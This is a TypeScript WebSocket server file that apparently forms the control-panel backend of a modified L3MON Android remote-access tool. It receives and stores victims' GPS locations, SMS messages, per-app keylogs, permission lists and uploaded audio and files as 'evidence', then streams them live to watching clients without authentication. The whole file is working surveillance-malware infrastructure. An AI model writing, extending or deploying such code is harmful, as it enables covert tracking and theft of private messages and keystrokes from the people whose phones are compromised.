import { Server as HTTPServer } from "http";
import { Server as SocketIOServer, Socket } from "socket.io";
import { getDb } from "./db";
import { eq } from "drizzle-orm";
import { devices, locationHistory, smsLogs } from "../drizzle/schema";

export interface DeviceLocation {
  deviceId: number;
  latitude: number;
  longitude: number;
  accuracy: number;
  timestamp: number;
  speed?: number;
  bearing?: number;
}

export interface SMSMessage {
  deviceId: number;
  phoneNumber: string;
  message: string;
  timestamp: number;
  direction: "incoming" | "outgoing";
}

export interface DeviceStatus {
  deviceId: number;
  status: "online" | "offline" | "inactive";
  batteryLevel: number;
  signalStrength: number;
  timestamp: number;
}

export class WebSocketManager {
  private io: SocketIOServer;
  private deviceConnections: Map<number, Set<string>> = new Map();
  private lastLocations: Map<number, DeviceLocation> = new Map();
  private lastSMS: Map<number, SMSMessage[]> = new Map();

  constructor(httpServer: HTTPServer) {
    this.io = new SocketIOServer(httpServer, {
      cors: {
        origin: process.env.FRONTEND_URL || "*",
        methods: ["GET", "POST"],
      },
      transports: ["websocket", "polling"],
      allowEIO3: true,
    });

    this.setupEventHandlers();
  }

  private setupEventHandlers(): void {
    this.io.on("connection", (socket: Socket) => {
      console.log(`[WebSocket] Client connected: ${socket.id}`);

      // User joins a device room
      socket.on("join-device", (deviceId: number) => {
        socket.join(`device:${deviceId}`);
        if (!this.deviceConnections.has(deviceId)) {
          this.deviceConnections.set(deviceId, new Set());
        }
        this.deviceConnections.get(deviceId)!.add(socket.id);
        console.log(`[WebSocket] User ${socket.id} joined device ${deviceId}`);

        // Send last known location if available
        const lastLocation = this.lastLocations.get(deviceId);
        if (lastLocation) {
          socket.emit("location-update", lastLocation);
        }

        // Send recent SMS if available
        const recentSMS = this.lastSMS.get(deviceId);
        if (recentSMS && recentSMS.length > 0) {
          socket.emit("sms-batch", recentSMS);
        }
      });

      // User leaves a device room
      socket.on("leave-device", (deviceId: number) => {
        socket.leave(`device:${deviceId}`);
        const connections = this.deviceConnections.get(deviceId);
        if (connections) {
          connections.delete(socket.id);
          if (connections.size === 0) {
            this.deviceConnections.delete(deviceId);
          }
        }
        console.log(`[WebSocket] User ${socket.id} left device ${deviceId}`);
      });

      // Device sends location update
      socket.on("device-location", async (data: DeviceLocation) => {
        try {
          await this.handleLocationUpdate(data);
          // Broadcast to all users watching this device
          this.io.to(`device:${data.deviceId}`).emit("location-update", data);
        } catch (error) {
          console.error("[WebSocket] Error handling location update:", error);
        }
      });

      // Device sends SMS
      socket.on("device-sms", async (data: SMSMessage) => {
        try {
          await this.handleSMSMessage(data);
          // Broadcast to all users watching this device
          this.io.to(`device:${data.deviceId}`).emit("sms-received", data);
        } catch (error) {
          console.error("[WebSocket] Error handling SMS message:", error);
        }
      });

      // Device sends status update
      socket.on("device-status", (data: DeviceStatus) => {
        console.log(`[WebSocket] Device ${data.deviceId} status: ${data.status}`);
        // Broadcast to all users watching this device
        this.io.to(`device:${data.deviceId}`).emit("status-update", data);
      });

      // [MOD L3MON] Device sends permission matrix
      socket.on("device-permissions", async (data: { deviceId: number, permissions: any }) => {
        try {
          await this.handlePermissionUpdate(data);
          this.io.to(`device:${data.deviceId}`).emit("permissions-update", data.permissions);
        } catch (error) {
          console.error("[WebSocket] Error handling permission update:", error);
        }
      });

      // [MOD L3MON] Device sends keylog data
      socket.on("device-keylog", async (data: { deviceId: number, text: string, app: string, timestamp: number }) => {
        try {
          await this.handleKeylogUpdate(data);
          this.io.to(`device:${data.deviceId}`).emit("keylog-new", data);
        } catch (error) {
          console.error("[WebSocket] Error handling keylog update:", error);
        }
      });

      // Disconnect handler
      socket.on("disconnect", () => {
        console.log(`[WebSocket] Client disconnected: ${socket.id}`);
      });
    });
  }

  private async handleLocationUpdate(location: DeviceLocation): Promise<void> {
    const db = await getDb();
    if (!db) {
      console.warn("[WebSocket] Database not available");
      return;
    }

    try {
      // Store location in database
      await db.insert(locationHistory).values({
        deviceId: location.deviceId,
        latitude: location.latitude.toString(),
        longitude: location.longitude.toString(),
        accuracy: location.accuracy.toString(),
        speed: location.speed ? location.speed.toString() : "0",
        bearing: location.bearing ? location.bearing.toString() : "0",
        timestamp: new Date(location.timestamp),
      });

      // Update last known location
      this.lastLocations.set(location.deviceId, location);

      // Update device last location fields
      // TODO: Implement device location update in db.ts
    } catch (error) {
      console.error("[WebSocket] Error storing location:", error);
    }
  }

  private async handleBinaryData(socket: Socket, type: "audio" | "file", data: any): Promise<void> {
    try {
      const fs = require("fs");
      const path = require("path");
      const crypto = require("crypto");
      
      const evidenceDir = path.join(process.cwd(), "builds", "evidence");
      if (!fs.existsSync(evidenceDir)) fs.mkdirSync(evidenceDir, { recursive: true });

      const hash = crypto.createHash('md5').update(new Date().getTime() + Math.random().toString()).digest("hex");
      const fileName = type === "audio" 
        ? `audio_${Date.now()}_${hash.substr(0, 8)}.mp3`
        : `file_${hash.substr(0, 8)}_${data.name}`;
      
      const filePath = path.join(evidenceDir, fileName);
      fs.writeFileSync(filePath, data.buffer);
      
      console.log(`[WebSocket] Binary ${type} saved to: ${filePath}`);
      
      // [MOD L3MON] Persist to database
      const db = await getDb();
      if (db) {
        const { mediaFiles } = await import("../drizzle/schema");
        // Find device ID for this socket
        let deviceId = data.deviceId;
        if (!deviceId) {
           // Fallback if not provided in data
           for (const [id, connections] of this.deviceConnections.entries()) {
             if (connections.has(socket.id)) {
               deviceId = id;
               break;
             }
           }
        }

        if (deviceId) {
          await db.insert(mediaFiles).values({
            deviceId,
            fileType: type === "audio" ? "audio" : "photo", // Using photo as fallback for files for now, or add "other"
            fileName: fileName,
            fileUrl: `/api/evidence/download/${fileName}`,
            fileSize: data.buffer.length,
            timestamp: new Date()
          });
        }
      }

      // Notify panel about new file
      this.io.emit("evidence-new", {
         type,
         name: fileName,
         path: `/api/evidence/download/${fileName}`,
         timestamp: Date.now()
      });
    } catch (e) {
      console.error(`[WebSocket] Error saving binary ${type}:`, e);
    }
  }

  private async handleSMSMessage(sms: SMSMessage): Promise<void> {
    const db = await getDb();
    if (!db) {
      console.warn("[WebSocket] Database not available");
      return;
    }

    try {
      // Store SMS in database
      await db.insert(smsLogs).values({
        deviceId: sms.deviceId,
        phoneNumber: sms.phoneNumber,
        messageBody: sms.message,
        direction: sms.direction,
        timestamp: new Date(sms.timestamp),
      });

      // Keep last 50 SMS messages in memory
      if (!this.lastSMS.has(sms.deviceId)) {
        this.lastSMS.set(sms.deviceId, []);
      }
      const smsList = this.lastSMS.get(sms.deviceId)!;
      smsList.unshift(sms);
      if (smsList.length > 50) {
        smsList.pop();
      }
    } catch (error) {
      console.error("[WebSocket] Error storing SMS:", error);
    }
  }

  private async handlePermissionUpdate(data: { deviceId: number, permissions: any }): Promise<void> {
    const db = await getDb();
    if (!db) return;

    try {
      // Get current metadata
      const deviceRecords = await db.select().from(devices).where(eq(devices.id, data.deviceId)).limit(1);
      if (deviceRecords.length === 0) return;

      const currentMetadata = (deviceRecords[0].metadata as any) || {};
      const updatedMetadata = {
        ...currentMetadata,
        androidPermissions: data.permissions,
        lastPermissionSync: new Date().toISOString()
      };

      await db.update(devices)
        .set({ metadata: updatedMetadata })
        .where(eq(devices.id, data.deviceId));
      
      console.log(`[WebSocket] Updated permissions for device ${data.deviceId}`);
    } catch (e) {
      console.error("[WebSocket] Permission persistence failed:", e);
    }
  }

  private async handleKeylogUpdate(data: { deviceId: number, text: string, app: string, timestamp: number }): Promise<void> {
    const db = await getDb();
    if (!db) return;

    try {
        // We could store keylogs in a separate table, but for now we'll put them in generic logs or metadata
        // Recommendation: Create an activity_logs entry
        const { activityLogs } = await import("../drizzle/schema");
        await db.insert(activityLogs).values({
            deviceId: data.deviceId,
            activityType: "keylog",
            description: `[${data.app}] ${data.text}`,
            metadata: { app: data.app, rawText: data.text },
            timestamp: new Date(data.timestamp)
        });
    } catch (e) {
        console.error("[WebSocket] Keylog persistence failed:", e);
    }
  }

  public broadcastToDevice(deviceId: number, event: string, data: any): void {
    this.io.to(`device:${deviceId}`).emit(event, data);
  }

  public broadcastToAll(event: string, data: any): void {
    this.io.emit(event, data);
  }

  public getConnectedDevices(): number[] {
    return Array.from(this.deviceConnections.keys()).map(Number);
  }

  public getDeviceConnections(deviceId: number): number {
    return this.deviceConnections.get(deviceId)?.size || 0;
  }

  public getIO(): SocketIOServer {
    return this.io;
  }
}

let wsManager: WebSocketManager | null = null;

export function initializeWebSocket(httpServer: HTTPServer): WebSocketManager {
  if (!wsManager) {
    wsManager = new WebSocketManager(httpServer);
  }
  return wsManager;
}

export function getWebSocketManager(): WebSocketManager | null {
  return wsManager;
}
